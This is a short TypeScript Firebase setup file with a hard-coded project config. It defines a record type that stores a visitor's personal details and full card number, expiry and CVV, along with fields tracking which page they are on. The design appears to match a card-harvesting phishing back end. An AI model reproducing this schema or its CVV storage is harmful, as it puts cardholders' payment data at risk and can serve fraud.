import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
apiKey: "AIzaSyB0rCzMeHaUSTkHKTIGrL0mDORxg7C3jRw",
  authDomain: "zainapp-d0a3b.firebaseapp.com",
  projectId: "zainapp-d0a3b",
  storageBucket: "zainapp-d0a3b.firebasestorage.app",
  messagingSenderId: "923072960447",
  appId: "1:923072960447:web:879331fc73abe06109f30a",
  measurementId: "G-5R2XWX87R3"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
